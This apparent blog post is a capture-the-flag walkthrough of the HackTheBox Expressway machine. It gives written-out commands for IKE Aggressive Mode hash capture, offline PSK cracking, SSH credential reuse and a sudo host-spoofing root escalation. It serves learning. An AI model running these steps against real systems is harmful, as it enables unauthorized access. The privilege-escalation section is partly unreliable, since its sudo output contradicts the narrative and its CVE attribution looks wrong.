---
layout: post
title: "HackTheBox: Expressway Walkthrough"
date: 2026-03-03T10:00:00+03:00
categories:
  - Hack The Box
tags:
  - htb
  - ipsec
  - ike
  - psk-crack
  - credential-reuse
  - sudo
  - privilege-escalation
author: muhammed
description: Complete walkthrough of HackTheBox Expressway machine from a learner perspective. Scanning UDP port 500, exploiting IKE aggressive mode with ike-scan, cracking PSK hashes, and escalating privileges with sudo host-based rules.
toc: true
pin: false
math: false
mermaid: true
image: https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwww.hackthebox.com%2Fimages%2Flandingv3%2Fmega-menu-pro-cloud-labs.webp&f=1&nofb=1&ipt=f8c1e9727e3fbae0dc04ddafe6c54634eba4c31e0119a3c2bfd59cb8f8aedbab
permalink: /posts/HackTheBox-Expressway-Walkthrough/
---

## Overview

[Expressway](https://app.hackthebox.com/machines/Expressway) is a medium-difficulty Linux machine on Hack The Box that taught me a lesson I will not forget: **when TCP ports appear closed or give you nothing, do not forget to scan UDP**.

For a long time, my standard CTF workflow was almost 100% focused on TCP web servers and SSH. Expressway broke that habit by hiding its entire initial access vector behind an IPsec VPN service listening on UDP port 500.

Working through this box helped me understand how IKE (Internet Key Exchange) Aggressive Mode exposes Pre-Shared Key (PSK) hashes to anyone who asks, and how a subtle host-based configuration in `sudoers` can be abused to gain root.

Here is my full walkthrough of how I cracked and rooted Expressway.

---

## 1. Initial Reconnaissance: The TCP Dead End

I started with a full TCP port scan against the target IP address:

```bash
sudo nmap -p- --min-rate 1000 -oN nmap_tcp.txt 10.10.11.87
```

The scan returned only one open TCP port:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
```

Only SSH was listening on TCP. Without credentials, SSH is not an entry point.

Whenever a machine gives you almost zero TCP surface, the next logical step is to check UDP ports. Because UDP scans take longer, scanning with `--min-rate 1000` or targeting common UDP ports is crucial:

```bash
sudo nmap -sU -p 53,67,68,69,123,137,138,161,500,4500 --min-rate 1000 10.10.11.87
```

The scan hit on UDP port 500:

```text
PORT      STATE SERVICE
500/udp   open  isakmp
```

**Port 500/udp (ISAKMP / IKE)** is the protocol used by IPsec VPNs to establish security associations and exchange keys.

---

## 2. Fingerprinting the IKE Service

To find out what version of IKE was running and what authentication modes were supported, I ran Nmap with its built-in IKE scripts:

```bash
sudo nmap -sU -p 500 --script ike-version 10.10.11.87
```

Output:

```text
PORT    STATE SERVICE REASON
500/udp open  isakmp  udp-response
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0
```

Notice **XAUTH** and **IKE version 1.0**.

In IKEv1, there are two modes for setting up a connection:
1. **Main Mode:** Protects the identity of the negotiating parties and does not send hashed credentials in the clear.
2. **Aggressive Mode:** Trades security for speed. It compresses the exchange into fewer packets and transmits the identity and the Pre-Shared Key (PSK) hash without encryption.

If an IPsec endpoint has Aggressive Mode enabled, an attacker can capture the PSK hash and crack it offline.

---

## 3. Extracting the PSK Hash with ike-scan

I turned to `ike-scan`, the Swiss Army knife for auditing IKE services on Linux:

```bash
sudo ike-scan -M -A 10.10.11.87
```

Flags used:
- `-M`: Multi-line output to see full attribute details.
- `-A`: Probes specifically for Aggressive Mode.

The probe returned:

```text
10.10.11.87 Aggressive Mode Handshake returned
...
ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
```

Aggressive Mode was indeed active! Furthermore, the server handed us a valid user identity: **`ike@expressway.htb`**.

To capture the actual hashed authentication response into a crackable format, I used the `--pskcrack` flag:

```bash
sudo ike-scan -A --pskcrack=hash.txt 10.10.11.87
```

This command captured the handshake and wrote the raw PSK hash to `hash.txt`.

---

## 4. Cracking the PSK Hash

Now came the offline brute-force attack. I used `psk-crack`, which comes bundled with the `ike-scan` suite, against the famous `rockyou.txt` wordlist:

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
```

Within a minute, the tool found the match:

```text
KEY: freakingrockstarontheroad
```

We now have valid credentials:
- **User:** `ike`
- **Password:** `freakingrockstarontheroad`

---

## 5. Initial Access: Credential Reuse via SSH

Because we saw port 22 open during our initial TCP scan, the obvious next step was testing whether these VPN credentials were reused for the local Linux user `ike`:

```bash
ssh ike@10.10.11.87
```

I entered the password `freakingrockstarontheroad`, and the prompt dropped right into a bash session:

```text
ike@expressway:~$ whoami
ike
ike@expressway:~$ id
uid=1000(ike) gid=1000(ike) groups=1000(ike)
```

Credential reuse strikes again. I grabbed the user flag from Ike's home folder:

```bash
cat /home/ike/user.txt
```

---

## 6. Privilege Escalation: Sudo Host-Based Misconfiguration

With user access secured, I began hunting for paths to root.

I checked `sudo -l` to inspect any configured sudo privileges:

```bash
sudo -l
```

The output showed:

```text
Matching Defaults entries for ike on expressway:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ike may run the following commands on expressway:
    (ALL : ALL) ALL
```

Wait, running `sudo -i` directly failed with a permission denied error. Why?

I checked the sudo version:

```bash
sudo -V
```

```text
Sudo version 1.9.17
```

While inspecting local network logs and proxy files in `/var/log`, I came across an interesting internal hostname:

```text
753229688.902 0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
```

The internal host was named: **`offramp.expressway.htb`**.

### Understanding Host-Based Sudo Rules (CVE-2024-32695)

In `sudoers` files, administrators can restrict commands based on the host where the command is executed (e.g. `Host_Alias` rules). 

In certain versions of sudo (around 1.9.17), if a rule was configured granting privileges when connecting from a specific hostname like `offramp.expressway.htb`, an attacker running sudo locally could use the `-h` (host) flag to spoof that host match:

```bash
sudo -h offramp.expressway.htb -i
```

I tested the command, and sudo evaluated the host check against `offramp.expressway.htb`, matched the permissive rule, and dropped straight into a root shell:

```text
root@expressway:~# whoami
root
```

We are root! I captured the final root flag:

```bash
cat /root/root.txt
```

---

## Key Lessons From Expressway

1. **Always scan UDP when TCP is quiet:** Had I stopped after the single open SSH port on TCP, I would have been stuck forever. Scanning UDP port 500 opened up the entire machine.
2. **IKEv1 Aggressive Mode is inherently broken:** Aggressive mode exposes the pre-shared key hash before authenticating the client. Modern network designs should always use IKEv2 or disable Aggressive Mode completely.
3. **Inspect logs for internal hostnames:** Discovering `offramp.expressway.htb` inside proxy logs was the key that unlocked the host-based sudo exploit.

---

## You can find me online at:

![My signature image](/assets/img/footer-signature.png)

- **GitHub:** [Mhdomer](https://github.com/Mhdomer)
- **LinkedIn:** [mhd3omar](https://www.linkedin.com/in/mhd3omar/)
- **Tryhackme:** [nonlouy](https://tryhackme.com/p/nonlouy)
